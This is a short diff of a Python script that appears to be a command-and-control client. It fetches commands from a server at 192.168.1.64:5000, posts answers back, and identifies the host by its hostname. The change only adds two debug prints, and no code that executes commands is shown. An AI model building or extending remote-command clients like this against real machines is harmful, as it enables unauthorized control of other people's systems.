@@ -10,6 +10,7 @@ import time
 cmd_url_order = 'http://192.168.1.64:5000/'
 cmd_url_answer = 'http://192.168.1.64:5000/answer'
 hostname = socket.gethostname()
+print(hostname)
 hostname_pattern = 'host:%s-00' % hostname
 headers = {}
 referer = {'Referer': hostname_pattern}
@@ -27,6 +28,7 @@ def get_cmd():
         return req
 
 supercmd = get_cmd()
+print(supercmd)
 
 
 
